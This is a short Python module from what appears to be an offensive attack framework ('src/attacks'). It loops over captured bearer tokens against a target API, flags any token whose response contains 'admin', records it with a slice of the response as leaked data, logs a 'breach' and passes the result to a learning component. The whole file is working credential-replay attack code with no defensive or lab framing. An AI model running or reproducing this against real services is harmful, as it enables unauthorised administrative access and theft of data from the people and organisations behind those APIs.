# src/attacks/api_takeover.py — v15.4
import asyncio
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class APITakeoverModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "api_takeover", "success": False, "risk": 10}

        tokens = options['context'].get('tokens', [])
        request = options.get('request')
        if not request or not tokens:
            return result

        self.logger.info(f"API TAKEOVER → {len(tokens)} токенов")

        for token in tokens:
            try:
                headers = {"Authorization": f"Bearer {token}"}
                resp = await request('GET', target, headers=headers)
                if resp and resp.status_code == 200 and "admin" in resp.text.lower():
                    result.update({
                        "success": True,
                        "vulnerable_payload": token,
                        "data_leaked": {"token": token, "response": resp.text[:500]}
                    })
                    self.logger.breach(f"API TAKEOVER: {token[:50]}...")
                    if self.brain:
                        self.brain.learn("api_takeover", target, token, True, resp.text[:300])
                    break
            except:
                continue

        return result